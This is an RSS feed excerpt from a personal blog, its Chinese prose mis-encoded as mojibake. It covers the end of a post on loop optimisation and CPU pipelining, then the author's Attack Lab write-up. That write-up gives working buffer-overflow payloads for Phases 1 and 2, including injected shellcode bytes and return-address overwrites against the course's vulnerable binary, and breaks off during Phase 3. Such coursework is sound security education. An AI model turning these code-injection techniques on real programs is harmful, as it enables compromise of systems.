&lt;p&gt;=&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;for(i=0;i&amp;lt;n;i++){
	int ni = n*i;
	for(j=0;j&amp;lt;n;j++)
		a[ni+j] = b[j];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å½“gccä½¿ç”¨O1ä»¥åŠæ›´é«˜çš„ä¼˜åŒ–çº§åˆ«æ—¶ä¼šå®æ–½.
2. å‡å°‘è®¡ç®—é‡
é€šè¿‡ç§»ä½å’ŒåŠ æ³•æ¥å®ç°ä¸€ä¸ªæ“ä½œæ•°ä¸ºå¸¸æ•°çš„ä¹˜é™¤æ³•.
ä¾‹å¦‚
&lt;code&gt;x*16&lt;/code&gt; =&amp;gt; &lt;code&gt;x&amp;lt;&amp;lt;4&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;for(i = 0;i&amp;lt;n;i++){
	int ni = n*i;
	for(j = 0;j&amp;lt;n;j++)
		a[ni+j] = b[j];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;=&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int ni = 0;
for(i=0;i&amp;lt;n;i++){
	for(j=0;j&amp;lt;n;j++)
		a[ni+j] = b[j];
	ni += n;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;å¤ç”¨è¡¨è¾¾å¼
å¦‚æœå«æœ‰ç›¸åŒçš„(å­)è¡¨è¾¾å¼,åœ¨gcc -O1ä»¥ä¸Šä¼šæœ‰ä¼˜åŒ–&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;è¶…æ ‡é‡æŒ‡ä»¤å¤„ç†å™¨(Superscalar Processor)&lt;/h1&gt;
&lt;p&gt;å®šä¹‰:åœ¨ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸèƒ½æ‰§è¡Œå¤šæ¡æŒ‡ä»¤çš„å¤„ç†å™¨.
ç°ä»£CPUè®¾è®¡:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214121024.png&quot; alt=&quot;&quot;&gt;
ç¨‹åºæ˜¯ä¸€ä¸ªé¡ºåºæ‰§è¡Œçš„æŒ‡ä»¤åºåˆ—,ä½†CPUè¯»å–å°½å¯èƒ½å¤šçš„æŒ‡ä»¤åºåˆ—,å‘ç°æœ‰çš„æŒ‡ä»¤ä¹‹é—´ä¸æ˜¯ç›¸äº’ä¾èµ–çš„,å¯ä»¥è¿›è¡ŒæŒ‡ä»¤çº§å¹¶è¡Œè®¡ç®—.
å°†ç¨‹åºè¿›è¡Œæ‹†åˆ†é‡ç»„,ä½¿è¿™äº›åŸºæœ¬å•å…ƒå°½å¯èƒ½ä¿æŒç¹å¿™.&lt;/p&gt;
&lt;h2&gt;æµæ°´çº¿åŠŸèƒ½å•å…ƒ(Pipeline Functional Units)&lt;/h2&gt;
&lt;p&gt;å‡è®¾ä¸€ä¸ªä¹˜æ³•è¿ç®—éœ€è¦3ä¸ªæ—¶é’Ÿå‘¨æœŸ,å¯¹äº&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long mult_eg(long a, long b, long c){
	long p1 = a*b;
	long p2 = a*c;
	long p3 = p1*p2;
	return p3;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ©ç”¨å¹¶è¡Œå¯ä»¥åœ¨7ä¸ªæ—¶é’Ÿå‘¨æœŸå†…å®Œæˆ:(æ³¨æ„è¿™æ˜¯å•æ ¸å®ç°,ä¸ç”¨å¤šæ ¸)&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;Mult_Stage\Time&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;1&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;2&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;3&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;4&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;5&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;6&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;7&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*b&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*c&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;p1*p2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*b&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*c&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;p1*p2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*b&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*c&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;p1*p2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;æ‰€ä»¥,æœ‰äº›æŒ‡ä»¤æ¯”è¾ƒæ…¢,ä½†é€šè¿‡æµæ°´çº¿æŠ€æœ¯å¯ä»¥ç¼©çŸ­æ—¶é—´.é™¤æ³•æ²¡æœ‰æµæ°´çº¿.&lt;/p&gt;
&lt;h2&gt;å¾ªç¯å±•å¼€&lt;/h2&gt;
&lt;p&gt;å‡å¦‚è¦è®¡ç®—ä¸€ä¸ªæ•°ç»„çš„ä¹˜ç§¯
(2*1)å¾ªç¯å±•å¼€:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Combine 2 elements at a time */ 
for (i = 0; i &amp;lt; limit; i+=2) { 
x = x OP (d[i] OP d[i+1]); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥å……åˆ†åˆ©ç”¨æµæ°´çº¿
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214153354.png&quot; alt=&quot;&quot;&gt;
èƒ½å¤Ÿæœ‰æ•ˆé™ä½è¿ç®—çš„å»¶è¿Ÿ(latency)&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰ä¸€ç§(2*2)å¾ªç¯å±•å¼€:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Combine 2 elements at a time */ 
for (i = 0; i &amp;lt; limit; i+=2) { 
	x0 = x0 OP d[i]; 
	x1 = x1 OP d[i+1]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214154035.png&quot; alt=&quot;&quot;&gt;
æ‰€ä»¥,å¯ä»¥å±•å¼€æˆKç»„,æ ¹æ®æµ‹è¯•ç»“æœé€‰æ‹©æœ€å¥½æ€§èƒ½.å–å†³äºæ•°æ®çš„ç±»å‹å’ŒåŠ æ³•å™¨/ä¹˜æ³•å™¨çš„æ•°é‡.ä¸æ˜è§‰å‰å•Š.
åœ¨è®²æµ®ç‚¹ä»£ç æ—¶æåˆ°çš„%ymmå¯„å­˜å™¨,ä»ç¡¬ä»¶å±‚é¢å±•ç°äº†æµæ°´çº¿çš„å®æ–½åŸç†:
SIMD æ“ä½œ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å•ç²¾åº¦:
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214155117.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;åŒç²¾åº¦:
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214155142.png&quot; alt=&quot;&quot;&gt;
è·Ÿå‘é‡è¿ç®—ä¸€æ ·,æ‰€ä»¥è¿™æ–¹é¢çš„ä¼˜åŒ–å«åšå‘é‡åŒ–ç¼–ç¨‹.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;åˆ†æ”¯é¢„æµ‹&lt;/h2&gt;
&lt;p&gt;ç”±äºCPUçš„ä¹±åºæ‰§è¡Œ,
CPUæŒ‡ä»¤å•å…ƒå¿…é¡»èµ°åœ¨æ‰§è¡Œå•å…ƒä¹‹å‰,ä½†é‡ä¸Šåˆ†æ”¯,é¢„æµ‹å“ªä¸€ä¸ªåˆ†æ”¯ä¼šè¢«æ‰§è¡Œ,ç„¶åCPUæå‰æ‰§è¡Œå¯¹åº”åˆ†æ”¯çš„ä»£ç .
å¦‚æœç»“æœè¯æ˜é¢„æµ‹æ­£ç¡®,å°±ç»§ç»­(ä¹±åºæ‰§è¡Œ);å¦‚æœé¢„æµ‹é”™è¯¯,åªèƒ½èˆå¼ƒå¹¶å€’å›å».&lt;/p&gt;
&lt;h1&gt;è·å¾—é«˜æ€§èƒ½&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;å¥½çš„ç¼–è¯‘å™¨ä¼˜åŒ–&lt;/li&gt;
&lt;li&gt;æ³¨æ„é¿å…éšç§˜çš„ç®—æ³•ä½æ•ˆ&lt;/li&gt;
&lt;li&gt;ç¼–å†™å¯¹ç¼–è¯‘å™¨å‹å¥½çš„ä»£ç :æ³¨æ„é¿å…é‡å¤çš„è¿‡ç¨‹è°ƒç”¨å’Œå†…å­˜å¼•ç”¨&lt;/li&gt;
&lt;li&gt;å…³æ³¨æœ€æ·±å±‚å¾ªç¯&lt;/li&gt;
&lt;li&gt;åˆ©ç”¨æŒ‡ä»¤çº§å¹¶è¡Œ&lt;/li&gt;
&lt;li&gt;é¿å…éš¾ä»¥é¢„æµ‹çš„åˆ†æ”¯&lt;/li&gt;
&lt;li&gt;å……åˆ†åˆ©ç”¨ç¼“å­˜(å±€éƒ¨æ€§)&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Fri, 24 Jan 2025 00:00:00 GMT</pubDate></item><item><title>Attacklab</title><link>https://www.tankimzeg.top/blog/attacklab/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/attacklab/</guid><description>Attacklab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/attacklab/&quot;&gt;https://www.tankimzeg.top/blog/attacklab/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;ä»‹ç»&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Phase 1~3: åˆ©ç”¨æ ˆæº¢å‡ºæ”»å‡»&lt;/li&gt;
&lt;li&gt;Phase 4~5: åˆ©ç”¨ROPæ”»å‡»
ctarget å’Œ rtargetéƒ½ç”¨getbufå‡½æ•°è¯»å–è¾“å…¥:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;unsigned getbuf(){
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Gets()&lt;/code&gt;å‡½æ•°æ˜¯å’Œ &lt;code&gt;gets()&lt;/code&gt;å‡½æ•°ç›¸ä¼¼,ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥.è¿™æ˜¯æº¢å‡ºçš„åˆ©ç”¨ç‚¹.&lt;/p&gt;
&lt;h2&gt;ROPä¸¾ä¾‹&lt;/h2&gt;
&lt;p&gt;ç›®çš„:popèµ‹å€¼0xBBBBBBBBç»™%rbx,ç„¶åå¤åˆ¶ç»™%rax
gadgets:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;address1:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;	mov    %rbx,%rax
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;address2:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;	pop    %rbx
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250124180130.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;å·¥å…·&lt;/h1&gt;
&lt;h2&gt;objdump&lt;/h2&gt;
&lt;p&gt;è¿™ä¸€æ¬¡,æˆ‘éœ€è¦ç”¨åˆ°objdumpå·¥å…·.è¿™æ˜¯æ˜¯Linuxä¸‹çš„åæ±‡ç¼–ç›®æ ‡æ–‡ä»¶æˆ–è€…å¯æ‰§è¡Œæ–‡ä»¶çš„å‘½ä»¤.
ä½¿ç”¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get install binutils
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®‰è£…åŒ…å«odjdumpçš„å·¥å…·&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;objdump -d example.o &amp;gt; example.d
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°†ç›®æ ‡æ–‡ä»¶åæ±‡ç¼–æˆæŒ‡ä»¤&lt;/p&gt;
&lt;h2&gt;hex2raw&lt;/h2&gt;
&lt;p&gt;å°†åå…­è¿›åˆ¶æ•°è½¬æ¢æˆå­—ç¬¦ä¸²,ä¾‹å¦‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* exploit.txt */
48 c7 c1 f0 11 40 00       /* mov $0x40011f0,%rcx */
68 ef cd ab 00             /* pushq $0xabcdef */ 
48 83 c0 11                /* add $0x11,%rax */ 
89 c2                      /* mov %eax,%edx */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥ç”¨I/Oé‡å®šå‘å­˜å‚¨è½¬æ¢åçš„æ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./hex2raw &amp;lt; explot.txt &amp;gt; exploit-raw.txt
./ctarget &amp;lt; exploit-raw.txt
gdb ctarget
(gdb) r &amp;lt; exploit-raw.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;GDB&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -c example.s
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;äº§ç”Ÿæ±‡ç¼–æ–‡ä»¶å¯¹åº”çš„ç›®æ ‡æ–‡ä»¶.
å½“ç„¶,ä½¿ç”¨GDBçš„è°ƒè¯•åŠŸèƒ½ç›‘è§†å†…å­˜åœ°å€å’Œå¯„å­˜å™¨ä¹Ÿæ˜¯å¿…ä¸å¯å°‘çš„.æˆ‘å·²ç»åœ¨Bomblabä¸­æŒæ¡äº†.&lt;/p&gt;
&lt;h1&gt;ctarget:Code Injection Attacks&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;getbuf()&lt;/code&gt;å‡½æ•°è¢« &lt;code&gt;test()&lt;/code&gt;å‡½æ•°è°ƒç”¨:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void test(){
	int val;
	val = getbuf();
	printf(&amp;quot;No exploit.  Getbuf return 0x%x\n&amp;quot;, val);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Phase 1&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªé—®é¢˜ä¸­,éœ€è¦æˆ‘ä¿®æ”¹è¿”å›åœ°å€,é‡å®šå‘åˆ°&lt;code&gt;touch1()&lt;/code&gt;å‡½æ•°:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void touch1(){
	vlevel = 1;
	printf(&amp;quot;Touch1!: You called touch1()\n&amp;quot;);
	validate(1);
	exit(0);	
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é¦–å…ˆ,æˆ‘åæ±‡ç¼– &lt;code&gt;getbuf()&lt;/code&gt;å‡½æ•°:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disass getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 &amp;lt;+0&amp;gt;:     sub    $0x28,%rsp
   0x00000000004017ac &amp;lt;+4&amp;gt;:     mov    %rsp,%rdi
   0x00000000004017af &amp;lt;+7&amp;gt;:     call   0x401a40 &amp;lt;Gets&amp;gt;
   0x00000000004017b4 &amp;lt;+12&amp;gt;:    mov    $0x1,%eax
   0x00000000004017b9 &amp;lt;+17&amp;gt;:    add    $0x28,%rsp
   0x00000000004017bd &amp;lt;+21&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;éå¸¸ç®€å•,é¦–å…ˆ%rspå‡å»40å­—èŠ‚,æ­¤æ—¶çš„%rspä½œä¸ºbufæŒ‡é’ˆä¼ ç»™ &lt;code&gt;Gets()&lt;/code&gt;å‡½æ•°,è°ƒç”¨ &lt;code&gt;Gets()&lt;/code&gt;å‡½æ•°å‰è¿”å›åœ°å€è®¾ç½®ä¸º0x4017b4.
å›é¡¾[[æœºå™¨çº§ç¼–ç¨‹III(è¿‡ç¨‹Procedure)#æ ˆå¸§|æ ˆå¸§]]çš„çŸ¥è¯†,å¦‚æœæˆ‘æŠŠè¿”å›åœ°å€è¦†å†™ä¸º&lt;code&gt;touch1()&lt;/code&gt;å‡½æ•°çš„åœ°å€,å°±èƒ½è·³è½¬åˆ°&lt;code&gt;touch1()&lt;/code&gt;å‡½æ•°.
å¯»æ‰¾&lt;code&gt;touch1()&lt;/code&gt;å‡½æ•°:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disass touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x00000000004017c4 &amp;lt;+4&amp;gt;:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc &amp;lt;vlevel&amp;gt;
   0x00000000004017ce &amp;lt;+14&amp;gt;:    mov    $0x4030c5,%edi
   0x00000000004017d3 &amp;lt;+19&amp;gt;:    call   0x400cc0 &amp;lt;puts@plt&amp;gt;
   0x00000000004017d8 &amp;lt;+24&amp;gt;:    mov    $0x1,%edi
   0x00000000004017dd &amp;lt;+29&amp;gt;:    call   0x401c8d &amp;lt;validate&amp;gt;
   0x00000000004017e2 &amp;lt;+34&amp;gt;:    mov    $0x0,%edi
   0x00000000004017e7 &amp;lt;+39&amp;gt;:    call   0x400e40 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¡«å……çš„å­—èŠ‚åº”ä¸º:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Phase1 */
ff ff ff ff ff ff ff ff /* %rsp~%rsp+7 */
ff ff ff ff ff ff ff ff /* %rsp+8~%rsp+15 */
ff ff ff ff ff ff ff ff /* %rsp+16~%rsp+23 */
ff ff ff ff ff ff ff ff /* %rsp+24~%rsp+31 */
ff ff ff ff ff ff ff ff /* %rsp+32~%rsp+39 */
c0 17 40                /* 0x4017c0 */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ„é€ å¥½å&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./hex2raw &amp;lt; Phase1 &amp;gt; Phase1-raw 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰§è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./ctarget -qi Phase1-raw
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸäº†!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF C0 17 40
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Phase 2&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªé—®é¢˜ä¸ä»…éœ€è¦è·³è½¬åˆ° &lt;code&gt;touch2()&lt;/code&gt;å‡½æ•°,è¿˜éœ€è¦ä¿®æ”¹%rdiå¯„å­˜å™¨çš„å€¼ä¼ å…¥æˆ‘çš„cookie.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void touch2(unsigned val){
	vlevel = 2;
	if(val==cookie){
		printf(&amp;quot;Touch2!: You called touch2(0x%.8x)\n&amp;quot;, val);
		validate(2);
	}
	else {
		printf(&amp;quot;Misfire: You called touch2(0x%.8x)\n&amp;quot;, val);
		fail(2);
	}
	exit(0);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Handoutæç¤ºæˆ‘,è¿™ä¸ªé—®é¢˜éœ€è¦æ³¨å…¥ä»£ç .ä¸Šè¯¾è§†é¢‘æåˆ°è¿‡æœ¬æ¬¡labæ²¡æœ‰ä½¿ç”¨æ ˆéšæœºåŒ–,è¿™ä¹Ÿæ˜¯æ³¨å…¥ä»£ç çš„å‰æ.ç»è¿‡gdbè°ƒè¯•,æˆ‘å‘ç°åœ¨æ‰§è¡Œ &lt;code&gt;Gets()&lt;/code&gt;å‡½æ•°å‰%rspæ€»æ˜¯ç­‰äº0x5561dc78,éªŒè¯äº†è¿™ä¸€ç‚¹.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250124224542.png&quot; alt=&quot;&quot;&gt;
æ¥çœ‹ &lt;code&gt;touch2()&lt;/code&gt;å‡½æ•°æ±‡ç¼–ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble touch2
Dump of assembler code for function touch2:
   0x00000000004017ec &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x00000000004017f0 &amp;lt;+4&amp;gt;:     mov    %edi,%edx
   0x00000000004017f2 &amp;lt;+6&amp;gt;:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc &amp;lt;vlevel&amp;gt;
   0x00000000004017fc &amp;lt;+16&amp;gt;:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 &amp;lt;cookie&amp;gt;
   0x0000000000401802 &amp;lt;+22&amp;gt;:    jne    0x401824 &amp;lt;touch2+56&amp;gt;
   0x0000000000401804 &amp;lt;+24&amp;gt;:    mov    $0x4030e8,%esi
   0x0000000000401809 &amp;lt;+29&amp;gt;:    mov    $0x1,%edi
   0x000000000040180e &amp;lt;+34&amp;gt;:    mov    $0x0,%eax
   0x0000000000401813 &amp;lt;+39&amp;gt;:    call   0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401818 &amp;lt;+44&amp;gt;:    mov    $0x2,%edi
   0x000000000040181d &amp;lt;+49&amp;gt;:    call   0x401c8d &amp;lt;validate&amp;gt;
   0x0000000000401822 &amp;lt;+54&amp;gt;:    jmp    0x401842 &amp;lt;touch2+86&amp;gt;
   0x0000000000401824 &amp;lt;+56&amp;gt;:    mov    $0x403110,%esi
   0x0000000000401829 &amp;lt;+61&amp;gt;:    mov    $0x1,%edi
   0x000000000040182e &amp;lt;+66&amp;gt;:    mov    $0x0,%eax
   0x0000000000401833 &amp;lt;+71&amp;gt;:    call   0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401838 &amp;lt;+76&amp;gt;:    mov    $0x2,%edi
   0x000000000040183d &amp;lt;+81&amp;gt;:    call   0x401d4f &amp;lt;fail&amp;gt;
   0x0000000000401842 &amp;lt;+86&amp;gt;:    mov    $0x0,%edi
   0x0000000000401847 &amp;lt;+91&amp;gt;:    call   0x400e40 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ„é€ æ³¨å…¥çš„ä»£ç ,é¦–å…ˆéœ€è¦è¦†å†™è¿”å›åœ°å€,ä½¿å…¶è·³è½¬åˆ°æˆ‘æ³¨å…¥ä»£ç çš„åœ°å€å¤„.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	mov    $0x59b997fa, %edi       # ä¼ å…¥å‚æ•°:æˆ‘çš„cookie
	mov    $0x4017ec,%r8
	call   *%r8                    # è·³è½¬åˆ°touch2å‡½æ•°(ä¸èƒ½ç”¨call 0x4017ec,ä¼šè·³è½¬åˆ°ç›¸å¯¹åœ°å€)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŠŠè¿™ä¸ªä»£ç ä¿å­˜ä¸ºPhase2.s.
è·å–ä»¥ä¸Šä»£ç çš„æœºå™¨æŒ‡ä»¤&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -c Phase2.s
objdump -d Phase2.o &amp;gt; Phase2.d
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;çœ‹çœ‹Phase2.dçš„è¾“å‡º:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ cat Phase2.d
Phase2.o:     file format elf64-x86-64


Disassembly of section .text:

   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
   5:   49 c7 c0 ec 17 40 00    mov    $0x4017ec,%r8
   c:   41 ff d0                call   *%r8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åæŠŠåå…­è¿›åˆ¶æ•°è¾“å…¥Phase2æ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Phase2 */
bf fa 97 b9 59          /* mov    $0x59b997fa,%edi */
49 c7 c0 ec 17 40 00    /* mov    $0x4017ec,%r8 */
41 ff d0                /* call   *%r8 */
/* ä»¥ä¸Š15å­—èŠ‚ */
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff
78 dc 61 55             /* è¿”å›åœ°å€è¦†å†™ä¸º0x5561dc78 */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç”Ÿæˆå­—ç¬¦ä¸²&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;mv Phase2.s Phase2.d Phase2.o
./hex2raw &amp;lt; Phase2 &amp;gt; Phase2-raw
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸäº†!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./ctarget -qi Phase2-raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 49 C7 C0 EC 17 40 00 41 FF D0 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Phase 3&lt;/h2&gt;
&lt;p&gt;Phase2ä¸­æˆ‘ç»™%rdiå¯„å­˜å™¨èµ‹å€¼ä¼ å‚,è€Œè¿™ä¸ªé—®é¢˜éœ€è¦ä»¥å­—ç¬¦æŒ‡é’ˆä¼ å‚.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void touch3(char *sval){
	vlevel = 3;
	if(hexmatch(cookie, sval)){
		printf(&amp;quot;Touch3!: You called touch3(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, sval);
		validate(3);
	}
	else{
		printf(&amp;quot;Misfire: You called touch3(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, sval);
		fail(3);
	}
	exit(0);
}

int hexmatch(unsigned val, char *sval){
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, &amp;quot;%.8x&amp;quot;, val);
	return strncmp(sval, s, 9) == 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŸ¥çœ‹ &lt;code&gt;touch3()&lt;/code&gt;å‡½æ•°æ‰€åœ¨ä½ç½®&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble  touch3
Dump of assembler code for function touch3:
   0x00000000004018fa &amp;lt;+0&amp;gt;:     push   %rbx
   0x00000000004018fb &amp;lt;+1&amp;gt;:     mov    %rdi,%rbx
   0x00000000004018fe &amp;lt;+4&amp;gt;:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc &amp;lt;vlevel&amp;gt;
   0x0000000000401908 &amp;lt;+14&amp;gt;:    mov    %rdi,%rsi
